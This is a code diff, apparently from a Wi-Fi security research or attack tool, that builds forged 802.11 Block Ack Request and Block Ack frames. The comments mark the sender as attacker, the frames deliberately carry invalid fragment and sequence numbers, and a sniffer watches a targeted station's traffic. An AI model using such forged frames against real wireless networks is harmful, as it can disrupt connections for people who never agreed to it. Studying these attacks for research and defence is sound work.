@@ -27,9 +27,9 @@ using namespace Tins;
 using namespace chrono;
 using json = nlohmann::json;
 
-RadioTap get_BAR_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, const uint8_t fn, const uint16_t sn){
+RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const uint8_t fn, const uint16_t sn){
 	//for some reason is dst first
-	Dot11BlockAckRequest bar(sta_hw, ap_hw); // AP(attacker) -> STA
+	Dot11BlockAckRequest bar(ap_mac, sta_mac); //  STA(attacker) -> AP
 	bar.fragment_number(fn);
 	bar.start_sequence(sn);
 	const vector<uint8_t> payload_data = {
@@ -40,8 +40,8 @@ RadioTap get_BAR_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, co
 	return rt / bar / RawPDU(payload_data);
 }
 
-RadioTap get_BA_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw){
-	Dot11BlockAck ba(ap_hw, sta_hw); // STA(attacker) -> AP
+RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac){
+	Dot11BlockAck ba(ap_mac, sta_mac); // STA(attacker) -> AP
 	ba.fragment_number(4);           // invalid FN
 	ba.start_sequence(1175);         // random invalid SSN
 	ba.bar_control(0x0004);
@@ -60,9 +60,9 @@ struct BARSContext{
 	atomic<bool> stop{false};
 };
 
-static void bars_sniffer_thread(const HWAddress<6> &sta_hw, const string &iface, BARSContext &ctx, const int timeout_sec
+static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx, const int timeout_sec
 ){
-	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_hw.to_string();
+	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_mac.to_string();
 
 	components::poll_sniffer_pdu<monostate>([&](PDU &pdu) ->optional<monostate>{
 		if(ctx.stop.load()) return monostate{};
